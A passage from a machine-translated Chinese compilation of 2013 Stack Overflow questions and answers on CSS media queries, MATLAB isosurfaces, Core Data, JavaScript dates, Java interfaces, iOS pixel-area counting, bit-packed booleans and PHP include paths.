这不应该发生在主屏幕上，只会发生在移动屏幕上。`exit()`我应该使用正确的命令吗？

我看不出我做错了什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:35:55.890

尝试使用 (min-width:481px) 代替。任何 > 480 的东西都应该有匹配，而任何 480 或更少的东西都不会。

min-width 使用 >= 匹配，其中包括移动屏幕的宽度 =480px。

# matlab - Matlab / Octave中X，Y，Z，V有序数据的等值面

> ID：14220713
> 
> 赞同：3
> 
> 时间：2013-01-08T17:28:07.670
> 
> 标签：matlab, octave, geometry-surface

我有一组 3d 数据点，每个数据点与某个数量的值 V 相关联。数据组织在有序列 XYZV 中，其中空间坐标分布在网格上。我在每个方向都有 21 个点，所以几列的长度是 21x21x21=9261。如何将数据转换为可以`isosurface`在 Octave/Matlab 中使用的网格？我的代码如下

```
a=load("data.txt");
X=reshape(a(:,1), 21,21,21);
Y=reshape(a(:,2), 21,21,21);
Z=reshape(a(:,3), 21,21,21);
V=reshape(a(:,2), 21,21,21);
fv=isosurface (X,Y,Z,V,0.9);
patch(fv) 
```

但结果没有意义（我得到两个平面位于 x=0.9 和 1。）。数据可以在[这里](http://cl.ly/text/2n3z430i1e12)下载。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T19:30:13.780

这是一种为您的数据创建适当网格网格的方法：

```
a = load('data.txt');
[X, Y, Z] = meshgrid(unique(a(:, 1)), unique(a(:, 2)), unique(a(:, 3)));
V = zeros(21, 21, 21);
for i = 1:numel(V)
  idx = find(a(:, 1) == X(i) & a(:, 2) == Y(i) & a(:, 3) == Z(i));
  V(i) = a(idx, 4);
end
fv = isosurface (X,Y,Z,V,0.9);
p = patch(fv);
set(p,'FaceColor','red','EdgeColor','none');
camlight;
lighting gouraud;
xlabel('x');
ylabel('y');
zlabel('z'); 
```

![在此处输入图像描述](../Images/1def28ae4c249f67f424f52014e8caf1.png)

如果你有更大的数据而且速度太慢，我可能会想出一种重塑原始数据的方法，以避免上面使用的 for 循环。

# iphone - CoreData 迁移 - 删除关系规则

> ID：14220715
> 
> 赞同：16
> 
> 时间：2013-01-08T17:28:13.020
> 
> 标签：iphone, ios, ipad, core-data, migration

`migration rules`在更改`deletion rule`a的情况下，我一无所获`managedObjects relationship`

我最初的 coredata 模型包含一个具有关系的实体。这种关系的删除规则是`cascade`。我不得不将此行为更改为`Nullify`.

因此，我创建了一个`new version of my coredata model`但没有任何轻量级迁移，它仍然有效。因此，如果我应该完成添加模型的新版本，或者更改删除规则（例如 from `cascade`to `nullify`）不会影响/不需要任何迁移，我会很担心。

有什么建议么？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-01-08T19:15:45.630

删除规则指定 Core Data*在运行时*的行为：如果一个对象被删除，其他关系可能被设置为 NULL，或者相关的对象也可能被删除。

因此我假设删除规则只存储在 Core Data 模型中，而不是持久存储文件中。

为了验证这一点，我从 2 个具有相同实体但删除规则不同的 Core Data 模型创建了 2 个存储文件。`NSStoreModelVersionHashes`持久存储`metadata`字典中的 是相同的。

事实上，这两个 SQLite 文件都是相同的，唯一的例外是“Z_METADATA”表中的“Z_UUID”，它是`NSStoreUUID`持久存储文件的。

此外，`addPersistentStoreWithType:...`如果加载存储的版本哈希与模型中的哈希不同，则会失败。

因此，更改删除规则应该不是问题。

# javascript - javascript中迄今为止的阶段字符串-Chrome问题

> ID：14220716
> 
> 赞同：1
> 
> 时间：2013-01-08T17:28:15.927
> 
> 标签：javascript

我在 javascript 函数中有一个字符串，例如 '30/05/1981'。我正在把它变成这样的约会......

```
new Date(arguments.Value) 
```

但是在 Chrome 中，当我尝试使用日期时，会出现“无效日期”错误。

它在所有其他浏览器中都能正常工作。

我将如何在 Chrome 中执行此操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:31:07.687

这是因为日期应采用以下格式`MM/DD/YYYY`：

```
new Date("30/05/1981".replace(/^(\d{2})\/(\d{2})/, "$2/$1")); 
```

但是`YYYY/MM/DD`也应该可以正常工作：

```
new Date("30/05/1981".split("/").reverse().join("/")); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:32:14.680

我不会依赖浏览器（因为客户端可能有不同的日期格式）。

我建议创建一个日期解析器或使用日期库，如[datejs](http://datejs.com/)或[SugarJS](http://sugarjs.com/features)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:33:01.743

这源于`DD/MM/YYYY`vs的冲突`MM/DD/YYYY`，*Chrome*仅通过使用后者来解决。您必须以不同的方式输入日期或进行一些字符串匹配。

```
var dateMatch = arguments.Value.match(/(\d\d)\/(\d\d)\/(\d\d\d\d)/);
new Date(+dateMatch[3], +dateMatch[2], +dateMatch[1]); 
```

# java - 什么时候接口中的方法“都”被覆盖和实现？

> ID：14220718
> 
> 赞同：1
> 
> 时间：2013-01-08T17:28:21.450
> 
> 标签：java, interface

以下代码来自[http://docs.oracle.com/javase/tutorial/java/IandI/examples/CharSequenceDemo.java](http://docs.oracle.com/javase/tutorial/java/IandI/examples/CharSequenceDemo.java)我在笔记本电脑的 netbeans 中运行以了解接口。

```
public class CharSequenceDemo implements CharSequence {
    private String s;

    public CharSequenceDemo(String s) {
        //It would be much more efficient to just reverse the string
        //in the constructor. But a lot less fun!
        this.s = s;
    }

    //If the string is backwards, the end is the beginning!
    private int fromEnd(int i) {
        return s.length() - 1 - i;
    }

    public char charAt(int i) {
        if ((i < 0) || (i >= s.length())) {
            throw new StringIndexOutOfBoundsException(i);
        }
        return s.charAt(fromEnd(i));
    }

    public int length() {
        return s.length();
    }

    public CharSequence subSequence(int start, int end) {
        if (start < 0) {
            throw new StringIndexOutOfBoundsException(start);
        }
        if (end > s.length()) {
            throw new StringIndexOutOfBoundsException(end);
        }
        if (start > end) {
            throw new StringIndexOutOfBoundsException(start - end);
        }
        StringBuilder sub = 
            new StringBuilder(s.subSequence(fromEnd(end), fromEnd(start)));
        return sub.reverse();
    }

    public String toString() {
        StringBuilder s = new StringBuilder(this.s);
        return s.reverse().toString();
    }

    //Random int from 0 to max. As random() generates values between 0 and 0.9999
    private static int random(int max) {
        return (int) Math.round(Math.random() * (max+1));
    }

    public static void main(String[] args) {
        CharSequenceDemo s =
            new CharSequenceDemo("Write a class that implements the CharSequence interface found in the java.lang package.");

        //exercise charAt() and length()
        for (int i = 0; i < s.length(); i++) {
            System.out.print(s.charAt(i));
        }

        System.out.println("");

        //exercise subSequence() and length();
        int start = random(s.length() - 1);
        int end = random(s.length() - 1 - start) + start;
        System.out.println(s.subSequence(start, end));

        //exercise toString();
        System.out.println(s);

    }
} 
```

对于方法 toString netbeans 说-> 方法被覆盖和实现，但对于其他方法，它只是说被覆盖。覆盖和实现方法有什么区别？他们不是一样的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:35:14.270

在 Java 5.0 中，@Override 只能放置在覆盖超类中定义的方法的方法上，而不是在接口中声明的方法上。在 Java 6+ 中，您可以将 @Override 放在实现和覆盖方法上。

在 Java 6+ 中，您可以在不实现的情况下覆盖

```
interface A {
    void method();
}

interface B extends A {
    @Override
    void method();
}

abstract class C implements A {
    @Override
    public abstract void method();
}

class D extends C {
    @Override
    public void method() {
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:50:28.260

当您说“对于另一个它只是说被覆盖”时，您实际上是指已实施吗？

charAt、length 和 subSequence 方法被标记为已实现，因为 a) 接口列出了它们，b) 您已经为它们添加了代码（实现了它们）。

toString 方法说被覆盖是因为该接口覆盖了所有 Java 对象都具有的 toString 方法，并且您还在 CharSequenceDemo 中实现了它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:32:10.640

**implements** - 你已经从实现的接口定义了每个方法

**extends** - 您可以使用在父类中编写的方法

* * *

实施来自您的界面。

Override 来自 Object（每个 java 对象都隐式扩展 Object）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-08T17:35:28.173

**[CharSequence](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/CharSequence.html#toString%28%29)**具有`toString()`方法，当您的类实现 CharSequence 时，您的类将被迫实现 toString()（因此实现），但是由于声明您的类的所有类的扩展`java.lang.Object`都`toString()`将从 Object 类继承它（因此被覆盖）。

因此在你的情况下

*   toString() ---> 从 CharSequence 实现
*   toString() ---> 从 java.lang.Object 覆盖

# iphone - iOS如何计算曲线包围的像素数/面积？

> ID：14220719
> 
> 赞同：8
> 
> 时间：2013-01-08T17:28:30.783
> 
> 标签：iphone, objective-c, ios, area, curve

我得到了一条任意形状的曲线，包围了一些区域。**我想估计曲线包围在 iPhone/iPad 屏幕上的像素数。**我该怎么做？

*   曲线定义为点的连续 x/y 坐标。
*   一条曲线是闭合的。
*   用户的触摸（touchesMoved 方法）绘制了一条曲线，我不知道它的样子

![在此处输入图像描述](../Images/221b84f3c6fceba61d407fd7fb051b08.png)

我正在考虑以某种方式用颜色填充闭合曲线，然后在屏幕截图中计算这种颜色的像素数。这意味着我需要知道如何以编程方式用颜色填充闭合曲线。

还有其他我没有想到的方法吗？

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-11T22:30:40.173

让我们通过创建一个包含曲线的 Quartz 路径来做到这一点。然后我们将创建一个位图上下文并在该上下文中填充路径。然后我们可以检查位图并计算填充的像素。我们将把这一切包装在一个方便的函数中：

```
static double areaOfCurveWithPoints(const CGPoint *points, size_t count) { 
```

首先我们需要创建路径：

```
 CGPathRef path = createClosedPathWithPoints(points, count); 
```

然后我们需要得到路径的边界框。 `CGPoint`坐标不必是整数，但位图必须具有整数尺寸，所以我们将得到一个至少与路径的边界框一样大的整数边界框：

```
 CGRect frame = integralFrameForPath(path); 
```

我们还需要决定制作位图的宽度（以字节为单位）：

```
 size_t bytesPerRow = bytesPerRowForWidth(frame.size.width); 
```

现在我们可以创建位图：

```
 CGContextRef gc = createBitmapContextWithFrame(frame, bytesPerRow); 
```

位图在创建时用黑色填充。我们将用白色填充路径：

```
 CGContextSetFillColorWithColor(gc, [UIColor whiteColor].CGColor);
    CGContextAddPath(gc, path);
    CGContextFillPath(gc); 
```

现在我们完成了路径，所以我们可以释放它：

```
 CGPathRelease(path); 
```

接下来我们将计算填充的区域：

```
 double area = areaFilledInBitmapContext(gc); 
```

现在我们完成了位图上下文，所以我们可以释放它：

```
 CGContextRelease(gc); 
```

最后，我们可以返回我们计算的区域：

```
 return area;
} 
```

嗯，这很容易！但是我们必须编写所有这些辅助函数。让我们从顶部开始。创建路径很简单：

```
static CGPathRef createClosedPathWithPoints(const CGPoint *points, size_t count) {
    CGMutablePathRef path = CGPathCreateMutable();
    CGPathAddLines(path, NULL, points, count);
    CGPathCloseSubpath(path);
    return path;
} 
```

获取路径的积分边界框也很简单：

```
static CGRect integralFrameForPath(CGPathRef path) {
    CGRect frame = CGPathGetBoundingBox(path);
    return CGRectIntegral(frame);
} 
```

要选择位图每行的字节数，我们可以只使用路径边界框的宽度。但我认为 Quartz 喜欢使用 2 的幂的倍数的位图。我还没有对此进行任何测试，所以你可能想尝试一下。现在，我们将宽度四舍五入到下一个最小的 64 倍数：

```
static size_t bytesPerRowForWidth(CGFloat width) {
    static const size_t kFactor = 64;
    // Round up to a multiple of kFactor, which must be a power of 2.
    return ((size_t)width + (kFactor - 1)) & ~(kFactor - 1);
} 
```

我们使用计算的大小创建位图上下文。我们还需要平移坐标系的原点。为什么？因为路径边界框的原点可能不在 (0, 0) 处。

```
static CGContextRef createBitmapContextWithFrame(CGRect frame, size_t bytesPerRow) {
    CGColorSpaceRef grayscale = CGColorSpaceCreateDeviceGray();
    CGContextRef gc = CGBitmapContextCreate(NULL, frame.size.width, frame.size.height, 8, bytesPerRow, grayscale, kCGImageAlphaNone);
    CGColorSpaceRelease(grayscale);
    CGContextTranslateCTM(gc, -frame.origin.x, -frame.origin.x);
    return gc;
} 
```

最后，我们需要编写实际计算填充像素的助手。我们必须决定如何计算像素。每个像素由一个无符号 8 位整数表示。黑色像素为 0。白色像素为 255。中间的数字是灰色阴影。当 Quartz 使用灰色像素填充路径时，它会消除路径边缘的锯齿。所以我们必须决定如何计算那些灰色像素。

一种方法是定义一个阈值，例如 128。任何等于或高于阈值的像素都算作填充；其余的算作未填写。

另一种方法是将灰色像素计算为部分填充，然后将部分填充相加。因此，两个完全填充了一半的像素组合在一起，算作一个完全填充的像素。让我们这样做：

```
static double areaFilledInBitmapContext(gc) {
    size_t width = CGBitmapContextGetWidth(gc);
    size_t height = CGBitmapContextGetHeight(gc);
    size_t stride = CGBitmapContextGetBytesPerRow(gc);
    uint8_t *pixels = CGBitmapContextGetData(gc);
    uint64_t coverage = 0;
    for (size_t y = 0; y < height; ++y) {
        for (size_t x = 0; x < width; ++x) {
            coverage += pixels[y * stride + x];
        }
    }
    return (double)coverage / UINT8_MAX;
} 
```

[您可以在此 gist](https://gist.github.com/4514516)中找到捆绑的所有代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:17:59.220

我会把这幅画当作 CGIMage 来抓取......

(CGBitmapContextCreateImage(UIGraphicsGetCurrentContext());

然后，按照上面的建议，使用“Flood Fill”方法来计算像素。（谷歌洪水填充）

# java - 一字节布尔值。为什么？

> ID：14220726
> 
> 赞同：42
> 
> 时间：2013-01-08T17:29:00.487
> 
> 标签：java, c++, performance, boolean, primitive

在 C++ 中，为什么 bool 需要一个字节来存储真或假，而只有一位就足够了，比如 0 代表假，1 代表真？（为什么 Java 也需要一个字节？）

其次，使用以下内容有多安全？

```
struct Bool {
    bool trueOrFalse : 1;
}; 
```

第三，就算是安全的，上面的野外技术真的有用吗？因为我听说我们在那里节省了空间，但是编译器生成的访问它们的代码仍然比生成的访问原语的代码更大更慢。

* * *

## 回答 #1

> 赞同：91
> 
> 时间：2013-01-08T17:30:10.807

> 为什么 bool 需要一个字节来存储 true 或 false 而只有一位就足够了

因为 C++ 中的每个对象都必须是可单独寻址的^*（也就是说，您必须能够拥有指向它的指针）。您不能寻址单个位（至少不能在传统硬件上）。

> 使用以下内容有多安全？

它是“安全的”，但收效甚微。

> 上述现场技术真的有用吗？

不，出于与上述相同的原因；）

> 但是编译器生成的访问它们的代码仍然比生成的访问原语的代码更大且更慢。

是的，这是真的。在大多数平台上，这需要访问包含字节（或`int`或其他），然后执行位移和位掩码操作以访问相关位。

* * *

如果您真的关心内存使用情况，您可以[`std::bitset`](http://en.cppreference.com/w/cpp/utility/bitset)在 C++ 或[`BitSet`](http://docs.oracle.com/javase/6/docs/api/java/util/BitSet.html)Java 中使用 a ，它们会打包位。

* * *

[* 除少数例外。]

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-01-08T17:31:00.373

使用单个位要慢得多，分配起来要复杂得多。在 C/C++ 中，没有办法获得一位的地址，因此您将无法做到`&trueOrFalse`这一点。

Java 有一个 BitSet 和 EnumSet，它们都使用位图。如果您的人数很少，则可能没有太大区别。例如，对象必须至少是字节对齐的，而在 HotSpot 中是 8 字节对齐的（在 C++ 中，`new`对象可以是 8 到 16 字节对齐的）这意味着节省一些位可能不会节省任何空间。

至少在 Java 中，Bits 不会更快，除非它们更适合缓存。

```
public static void main(String... ignored) {
    BitSet bits = new BitSet(4000);
    byte[] bytes = new byte[4000];
    short[] shorts = new short[4000];
    int[] ints = new int[4000];

    for (int i = 0; i < 100; i++) {
        long bitTime = timeFlip(bits) + timeFlip(bits);
        long bytesTime = timeFlip(bytes) + timeFlip(bytes);
        long shortsTime = timeFlip(shorts) + timeFlip(shorts);
        long intsTime = timeFlip(ints) + timeFlip(ints);
        System.out.printf("Flip time bits %.1f ns, bytes %.1f, shorts %.1f, ints %.1f%n",
                bitTime / 2.0 / bits.size(), bytesTime / 2.0 / bytes.length,
                shortsTime / 2.0 / shorts.length, intsTime / 2.0 / ints.length);
    }
}

private static long timeFlip(BitSet bits) {
    long start = System.nanoTime();
    for (int i = 0, len = bits.size(); i < len; i++)
        bits.flip(i);
    return System.nanoTime() - start;
}

private static long timeFlip(short[] shorts) {
    long start = System.nanoTime();
    for (int i = 0, len = shorts.length; i < len; i++)
        shorts[i] ^= 1;
    return System.nanoTime() - start;
}

private static long timeFlip(byte[] bytes) {
    long start = System.nanoTime();
    for (int i = 0, len = bytes.length; i < len; i++)
        bytes[i] ^= 1;
    return System.nanoTime() - start;
}

private static long timeFlip(int[] ints) {
    long start = System.nanoTime();
    for (int i = 0, len = ints.length; i < len; i++)
        ints[i] ^= 1;
    return System.nanoTime() - start;
} 
```

印刷

```
Flip time bits 5.0 ns, bytes 0.6, shorts 0.6, ints 0.6 
```

适用于 40000 和 400K 的尺寸

```
Flip time bits 6.2 ns, bytes 0.7, shorts 0.8, ints 1.1 
```

4M

```
Flip time bits 4.1 ns, bytes 0.5, shorts 1.0, ints 2.3 
```

和 40M

```
Flip time bits 6.2 ns, bytes 0.7, shorts 1.1, ints 2.4 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-01-08T23:21:47.457

如果您只想存储一位信息，没有什么比 a 更紧凑的了`char`，它是 C/C++ 中最小的可寻址内存单元。（根据实现， a`bool`可能与 a 具有相同的大小，`char`但[允许更大](https://stackoverflow.com/questions/4897844/is-sizeofbool-implementation-defined-in-c)。）

`char`C 标准保证A至少包含 8 位，但是，它也可以包含更多位。确切的数字可通过(C) 或(C++)中[`CHAR_BIT`](http://www.cplusplus.com/reference/climits/)定义的宏获得。今天，这是最常见的，但你不能依赖它（见[这里](https://stackoverflow.com/questions/5516044/system-where-1-byte-8-bit)）。[但是，在 POSIX 兼容系统和Windows](http://msdn.microsoft.com/en-us/library/k15zsh48.aspx)上，它保证为 8 。`limits.h``climits``CHAR_BIT == 8`

虽然不可能减少单个标志的内存占用，但当然可以组合多个标志。除了[手动进行所有位操作](https://stackoverflow.com/questions/1044654/bitfield-manipulation-in-c)之外，还有一些替代方法：

*   如果您在编译时知道位数
    1.  [位域](http://publications.gbdirect.co.uk/c_book/chapter6/bitfields.html)（如你的问题）。但请注意，字段的顺序并不能保证，这可能会导致可移植性问题。
    2.  [`std::bitset`](http://www.sgi.com/tech/stl/bitset.html)
*   如果您只在运行时知道大小
    1.  [`boost::dynamic_bitset`](http://www.boost.org/doc/libs/1_52_0/libs/dynamic_bitset/dynamic_bitset.html)
    2.  如果您必须处理大型位向量，请查看[BitMagic 库](http://bmagic.sourceforge.net/)。它支持压缩并经过大量调整。

正如其他人已经指出的那样，节省一些位并不总是一个好主意。可能的缺点是：

1.  可读性较差的代码
2.  由于额外的提取代码而降低了执行速度。
3.  出于同样的原因，代码大小的增加可能会超过数据消耗的节省。
4.  多线程程序中隐藏的同步问题。例如，两个不同的线程翻转两个不同的位可能会导致竞争条件。相反，两个线程修改两个不同的原始类型对象（例如，`char`）总是安全的。

通常，当您处理大量数据时，这是有意义的，因为这样您将受益于内存和缓存压力较小。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-01-09T01:23:42.503

为什么不将状态存储到一个字节？还没有实际测试过以下内容，但它应该给你一个想法。您甚至可以将 short 或 int 用于 16 或 32 个状态。我相信我也有一个有效的 JAVA 示例。当我找到它时，我会发布这个。

```
__int8 state = 0x0;

bool getState(int bit)
{
  return (state & (1 << bit)) != 0x0;
}

void setAllOnline(bool online)
{
  state = -online;
}

void reverseState(int bit)
{
   state ^= (1 << bit);
} 
```

好的，这里是 JAVA 版本。从那以后，我将其存储为 Int 值。如果我没记错的话，即使使用一个字节也会使用 4 个字节。这显然不能用作数组。

```
public class State
{
    private int STATE;

    public State() { 
        STATE = 0x0;
    }

    public State(int previous) { 
        STATE = previous;
    }

   /*
    * @Usage - Used along side the #setMultiple(int, boolean);
    * @Returns the value of a single bit.
    */
    public static int valueOf(int bit)
    {
        return 1 << bit;
    }

   /*
    * @Usage - Used along side the #setMultiple(int, boolean);
    * @Returns the value of an array of bits.
    */
    public static int valueOf(int... bits)
    {
        int value = 0x0;
        for (int bit : bits)
            value |= (1 << bit);
        return value;
    }

   /*
    * @Returns the value currently stored or the values of all 32 bits.
    */
    public int getValue() 
    {
        return STATE;
    }

   /*
    * @Usage - Turns all bits online or offline.
    * @Return - <TRUE> if all states are online. Otherwise <FALSE>.
    */
    public boolean setAll(boolean online)
    {
        STATE = online ? -1 : 0;
        return online;
    }

   /*
    * @Usage - sets multiple bits at once to a specific state.
    * @Warning - DO NOT SET BITS TO THIS! Use setMultiple(State.valueOf(#), boolean);
    * @Return - <TRUE> if states were set to online. Otherwise <FALSE>.
    */
    public boolean setMultiple(int value, boolean online)
    {
        STATE |= value;
        if (!online)
            STATE ^= value;
        return online;
    }

   /*
    * @Usage - sets a single bit to a specific state.
    * @Return - <TRUE> if this bit was set to online. Otherwise <FALSE>.
    */
    public boolean set(int bit, boolean online)
    {
        STATE |= (1 << bit);
        if(!online)
            STATE ^= (1 << bit);
        return online;
    }

   /*
    * @return = the new current state of this bit.
    * @Usage = Good for situations that are reversed.
    */
    public boolean reverse(int bit)
    {
        return (STATE ^= (1 << bit)) == (1 << bit);
    }

   /*
    * @return = <TRUE> if this bit is online. Otherwise <FALSE>.
    */
    public boolean online(int bit)
    {
        int value = 1 << bit;
        return (STATE & value) == value;        
    }

   /*
    * @return = a String contains full debug information.
    */
    @Override
    public String toString()
    {
        StringBuilder sb = new StringBuilder();
        sb.append("TOTAL VALUE: ");
        sb.append(STATE);
        for (int i = 0; i < 0x20; i++)
        {
            sb.append("\nState(");
            sb.append(i);
            sb.append("): ");
            sb.append(online(i));
            sb.append(", ValueOf: ");
            sb.append(State.valueOf(i));
        }
        return sb.toString();
    }
} 
```

另外我应该指出，您真的不应该为此使用特殊的类，而只是将变量存储在最有可能使用它的类中。如果您计划拥有 100 个甚至 1000 个布尔值，请考虑一个字节数组。

例如下面的例子。

```
boolean[] states = new boolean[4096]; 
```

可以转换成下面的。

```
int[] states = new int[128]; 
```

现在您可能想知道如何从 128 数组访问索引 4095。因此，如果我们简化它，它正在做的是。4095 向右移动 5 位，这在技术上与除以 32 相同。因此 4095 / 32 = 向下舍入 (127)。所以我们在数组的索引 127 处。然后我们执行 4095 & 31 将其转换为 0 到 31 之间的值。这只适用于 2 负 1 的幂。例如 0,1,3,7,15,31,63,127,255,511,1023 等...

所以现在我们可以访问那个位置的位。正如你所看到的，这是非常紧凑的，并且在一个文件中有 4096 个布尔值 :) 这也将为二进制文件提供更快的读/写。我不知道这个 BitSet 的东西是什么，但它看起来像完全垃​​圾，因为 byte、short、int、long 在技术上已经是它们的位形式，你不妨照原样使用它们。然后创建一些复杂的类来访问内存中的各个位，这是我通过阅读几篇文章可以掌握的。

```
boolean getState(int index)
{
    return (states[index >> 5] & 1 << (index & 0x1F)) != 0x0;
} 
```

更多的信息.​​..

基本上，如果上述内容有点令人困惑，这里是正在发生的事情的简化版本。

“ **byte** ”、“ **short** ”、“ **int** ”、“ **long** ”这些类型都是具有不同范围的数据类型。

您可以查看此链接： http: [//msdn.microsoft.com/en-us/library/s3f49ktz (v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/s3f49ktz(v=vs.80).aspx)

查看每个的数据范围。

所以一个字节等于8位。所以一个 4 字节的 int 将是 32 位。

现在没有任何简单的方法可以对**N 次**幂执行一些值。然而，由于位移，我们可以在某种程度上模拟它。通过执行 1 << N 这等于 1 * 2^N。因此，如果我们执行 2 << 2^N，我们将执行 2 * 2^N。所以要执行二的幂总是做“1 << N”。

现在我们知道一个 int 将有 32 位，所以可以使用每个位，所以我们可以简单地索引它们。

为了简单起见，可以将“&”运算符视为一种检查值是否包含另一个值的位的方法。假设我们有一个值为 31。要达到 31。我们必须添加以下位 0 到 4。它们是 1、2、4、8 和 16。这些加起来是 31。现在当我们执行31 & 16 这将返回 16，因为位 4 即 2^4 = 16。位于此值中。现在假设我们执行了 31 和 20，它检查第 2 位和第 4 位是否位于该值中。这将返回 20，因为第 2 位和第 4 位都位于此处 2^2 = 4 + 2^4 = 16 = 20。现在假设我们做了 31 和 48。这是检查第 4 位和第 5 位。好吧，我们不在 31 中有第 5 位。所以这只会返回 16。它不会返回 0。所以在执行多次检查时，您必须检查它在物理上是否等于该值。

下面将验证单个位是 0 还是 1。0 为假，1 为真。

```
bool getState(int bit)
{
    return (state & (1 << bit)) != 0x0;
} 
```

下面是检查两个值是否包含这些位的示例。把它想象成每一位都表示为 2^BIT 所以当我们这样做时

我将快速介绍一些运算符。我们最近刚刚稍微解释了“&”运算符。现在为“|” 操作员。

执行以下操作时

```
int value = 31;
value |= 16;
value |= 16;
value |= 16;
value |= 16; 
```

该值仍将是 31。这是因为位 4 或 2^4=16 已打开或设置为 1。所以执行“|” 在该位打开的情况下返回该值。如果它已经打开，则不会进行任何更改。我们使用“|=”将变量实际设置为该返回值。

而不是做->“值=值| 16；”。我们只做“值|= 16；”。

现在让我们进一步了解如何使用“ **&** ”和“ **|** ”。

```
/*
 * This contains bits 0,1,2,3,4,8,9 turned on.
 */
const int CHECK = 1 | 2 | 4 | 8 | 16 | 256 | 512;

/*
 * This is some value were we add bits 0 through 9, but we skip 0 and 8.
 */
int value = 2 | 4 | 8 | 16 | 32 | 64 | 128 | 512; 
```

所以当我们执行下面的代码时。

```
int return_code = value & CHECK; 
```

返回码将为 2 + 4 + 8 + 16 + 512 = 542

所以我们检查了 799，但我们收到了 542 这是因为位 o 和 8 离线，我们等于 256 + 1 = 257 和 799 - 257 = 542。

以上是检查我们是否正在制作视频游戏并想检查是否按下了某个按钮是否按下的好方法。我们可以简单地通过一次检查来检查这些位中的每一个，这将比对每个状态执行布尔检查效率高很多倍。

现在假设我们有一个总是反转的布尔值。

通常你会做类似的事情

```
bool state = false;

state = !state; 
```

这可以通过位来完成，也可以使用“ **^** ”运算符。

就像我们执行“1 << N”来选择该位的整个值一样。我们可以反过来做同样的事情。所以就像我们展示了“|=”如何存储返回值一样，我们将用“^=”做同样的事情。因此，如果该位打开，我们将其关闭。如果它关闭，我们将其打开。

```
void reverseState(int bit)
{
   state ^= (1 << bit);
} 
```

您甚至可以让它返回当前状态。如果您希望它返回以前的状态，只需将“！=”交换为“==”。所以它所做的是执行反转然后检查当前状态。

```
bool reverseAndGet(int bit)
{
    return ((state ^= (1 << bit)) & (1 << bit)) != 0x0;
} 
```

也可以将多个非单个位又名 bool 值存储到 int 中。假设我们通常像下面这样写出我们的坐标位置。

```
int posX = 0;
int posY = 0;
int posZ = 0; 
```

现在假设这些从未超过 1023。所以 0 到 1023 是所有这些的最大距离。如前所述，我选择 1023 用于其他目的，您可以操纵“&”变量作为强制介于 0 和 2^N - 1 值之间的值的一种方式。因此，假设您的范围是 0 到 1023。我们可以执行“value & 1023”，它始终是 0 到 1023 之间的值，无需任何索引参数检查。请记住，如前所述，这只适用于二减一的幂。2^10 = 1024 - 1 = 1023。

例如，如果（值 >= 0 && 值 <= 1023），则不再存在。

所以 2^10 = 1024，需要 10 位才能保存 0 到 1023 之间的数字。

所以 10x3 = 30 仍然小于或等于 32。足以将所有这些值保存在 int 中。

所以我们可以执行以下操作。所以看看我们使用了多少位。我们做 0 + 10 + 20。我把 0 放在那里的原因是为了直观地告诉你 2^0 = 1 所以# * 1 = #。我们需要 y << 10 的原因是因为 x 使用了 10 位，即 0 到 1023。所以我们需要将 y 乘以 1024 以使每个位具有唯一值。然后 Z 需要乘以 2^20，即 1,048,576。

```
int position = (x << 0) | (y << 10) | (z << 20); 
```

这样可以快速进行比较。

我们现在可以做

```
return this.position == position; 
```

相对于

```
return this.x == x && this.y == y && this.z == z; 
```

现在，如果我们想要每个人的实际位置怎么办？

对于 x，我们只需执行以下操作。

```
int getX()
{ 
   return position & 1023;
} 
```

然后对于 y 我们需要执行一个左位移然后它。

```
int getY()
{ 
   return (position >> 10) & 1023;
} 
```

您可能猜到 Z 与 Y 相同，但我们使用 20 而不是 10。

```
int getZ()
{ 
   return (position >> 20) & 1023;
} 
```

我希望任何看到这个的人都会发现值得一读的信息:)。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-01-08T18:13:10.770

如果你真的想使用 1 位，你可以使用 char 来存储 8 个布尔值，并使用 bitshift 来获得你想要的值。我怀疑它会更快，而且它可能会让你很头疼，但从技术上讲这是可能的。

附带说明一下，这样的尝试可能对没有大量内存可用于变量但确实具有比您需要的更多处理能力的系统有用。我非常怀疑你是否会需要它。

# php - PHP基本路径问题

> ID：14220733
> 
> 赞同：-3
> 
> 时间：2013-01-08T17:29:13.647
> 
> 标签：php

让我们以这个 URL 为例：

```
* http://localhost/amdseo/panel/manage/blogs.php
* http://localhost/amdseo/panel/index.php
* http://localhost/amdseo/panel/features/new/post.php 
```

我需要它们都包含以下文件，该文件位于

```
* http://localhost/amdseo/includes/include.php 
```

有没有可以引导我的代码

```
*http://localhost/amdseo/include/include.php 
```

无论我目前在哪个网址上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:31:01.167

我通常像这样构建我的包含：

```
require_once($_SERVER['DOCUMENT_ROOT'] . '/includes/include.php'); 
```

这会将您带到文档根目录并从那里构建路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:31:53.507

### 使用这种方式：

```
$appRoot = "/var/www/amdseo/panel";
include_once "$appRoot/manage/blogs.php";
include_once "$appRoot/index.php";
include_once "$appRoot/features/new/post.php"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:35:50.833

您需要建立一个基本文件夹，您可以从中查找它下面的任何文件。Relentless 的选择是一种方式，尽管我发现 DOCUMENT_ROOT 并不总是可用或正确的。您也可以使用`__DIR__`常量，或者`dirname(__FILE__)`如果是 5.4 之前的版本，则使用该常量的相对路径。

因为`http://localhost/amdseo/panel/manage/blogs.php`这将解决以下问题：

```
